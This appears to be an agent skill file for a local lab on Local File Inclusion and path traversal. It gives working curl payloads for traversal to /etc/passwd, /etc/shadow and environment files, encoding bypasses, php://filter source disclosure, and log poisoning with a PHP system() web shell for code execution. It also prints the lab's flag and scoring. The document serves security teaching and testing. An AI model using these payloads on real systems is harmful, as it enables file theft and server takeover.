---
name: detecting-lfi-path-traversal-vulnerabilities
description: >-
  Detect Local File Inclusion (LFI) and path traversal vulnerabilities in web
  applications that allow reading arbitrary files from the server. Covers manual
  payload testing, encoding bypasses, log poisoning for RCE, and PHP wrapper
  techniques in isolated Docker lab environments.
domain: cybersecurity
subdomain: web-application-testing
tags: [lfi, path-traversal, file-inclusion, owasp, intermediate, php-security]
difficulty: intermediate
mitre_techniques: [T1190, T1083]
nist_csf_functions: [Identify, Protect]
version: "1.0"
author: mukul975
license: Apache-2.0
lab_environment: labs/web-application/lfi-traversal
---

> ⚠️ **Educational Use Only** — LFI exploitation on unauthorized systems violates computer access laws. This skill is for authorized penetration testing, CTF practice, and learning to write secure code. Practice only in provided lab environments.

## When to Use

- During authorized web app pentests when parameters control file paths (`?page=home`, `?file=../`)
- In CTF challenges where reading `/etc/passwd` or a flag file is required
- When auditing PHP applications that use `include()` or `require()` with user input
- As a prerequisite for remote file inclusion (RFI), log poisoning, and PHP filter chain attacks
- When reviewing code for path traversal vulnerabilities in file upload or download handlers

## Prerequisites

- **Knowledge:** Basic HTTP GET parameters, Linux filesystem layout (`/etc/passwd`, `/var/log/`)
- **Lab:** `labs/web-application/lfi-traversal` — start with `agentlab start lfi-traversal`
- **Difficulty:** Intermediate
- **Time:** 30–45 minutes

## Workflow

### Step 1: Start the Lab

```bash
agentlab start lfi-traversal
# Vulnerable PHP app at http://localhost:8083/?page=home
```

### Step 2: Identify File Inclusion Parameters

Look for URL parameters that reference file names or paths:

```
http://target/?page=home
http://target/?file=about
http://target/?template=default
http://target/download.php?path=report.pdf
```

### Step 3: Test Basic Path Traversal

```bash
# Try to read /etc/passwd
curl "http://localhost:8083/?page=../../../etc/passwd"

# With .php extension appended by app (bypass with null byte — PHP < 5.3.4)
curl "http://localhost:8083/?page=../../../etc/passwd%00"

# Double encoding bypass
curl "http://localhost:8083/?page=..%252F..%252F..%252Fetc%252Fpasswd"

# Filter bypass with mixed traversal
curl "http://localhost:8083/?page=....//....//....//etc/passwd"
```

**Positive indicator:** `/etc/passwd` content appears in the response:
```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

### Step 4: Read Sensitive Files

Once LFI is confirmed, enumerate useful files:

```bash
# Common Linux targets
curl "http://localhost:8083/?page=../../../etc/passwd"
curl "http://localhost:8083/?page=../../../etc/shadow"        # Requires root
curl "http://localhost:8083/?page=../../../proc/self/environ" # Environment vars
curl "http://localhost:8083/?page=../../../var/log/apache2/access.log"  # For log poisoning

# Read the app's own source code
curl "http://localhost:8083/?page=../../../var/www/html/config.php"
```

### Step 5: PHP Wrapper — Base64 Source Disclosure

When the app appends `.php`, use PHP wrappers to read source:

```bash
# php://filter wrapper — encode output as base64 to read PHP files
curl "http://localhost:8083/?page=php://filter/convert.base64-encode/resource=config"

# Decode the result
echo "<base64-output>" | base64 -d
# Reveals: <?php $db_pass = 'supersecret'; ?>
```

### Step 6: Log Poisoning for RCE (Lab Only)

If you can read Apache access logs AND inject into them:

```bash
# Step 1: Plant PHP code in the User-Agent header (it gets logged)
curl -A "<?php system(\$_GET['cmd']); ?>" http://localhost:8083/

# Step 2: Include the log file via LFI and execute commands
curl "http://localhost:8083/?page=../../../var/log/apache2/access.log&cmd=id"
# Output: uid=33(www-data) gid=33(www-data)
```

> **Lab isolation note:** Command execution is sandboxed to the target container. No host access.

### Step 7: Capture the Flag

```bash
# The flag is in /flag.txt on the target container
curl "http://localhost:8083/?page=../../../flag.txt"
# FLAG{lfi_traversal_complete}
```

## Key Concepts

| Concept | Definition |
|---------|-----------|
| LFI | Local File Inclusion — using a file path parameter to include server-side files not intended for users |
| Path Traversal | Using `../` sequences to navigate outside the intended directory |
| Null Byte | `%00` — terminated strings in PHP < 5.3.4, bypassing `.php` appending |
| PHP Wrappers | Built-in PHP URL scheme handlers: `php://filter`, `php://input`, `data://` |
| Log Poisoning | Writing PHP code to a log file, then including it via LFI to achieve RCE |
| T1083 | MITRE ATT&CK: File and Directory Discovery |
| T1190 | MITRE ATT&CK: Exploit Public-Facing Application |

## Tools

| Tool | Purpose | Lab Availability |
|------|---------|-----------------|
| `curl` | Manual payload testing | ✅ Pre-installed |
| `ffuf` | Fuzzing file paths at scale | ✅ Pre-installed |
| `LFISuite` | Automated LFI testing toolkit | ✅ Pre-installed |
| Burp Suite | Request interception and modification | ⚠️ Install separately |

## Output / Verification

```bash
agentlab verify lfi-traversal "FLAG{lfi_traversal_complete}"
```

**Score:** 100 points for /etc/passwd, 150 for flag.txt, 200 bonus for log poisoning RCE

## Further Reading

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger LFI Labs](https://portswigger.net/web-security/file-path-traversal)
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/) | [T1083](https://attack.mitre.org/techniques/T1083/)
- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
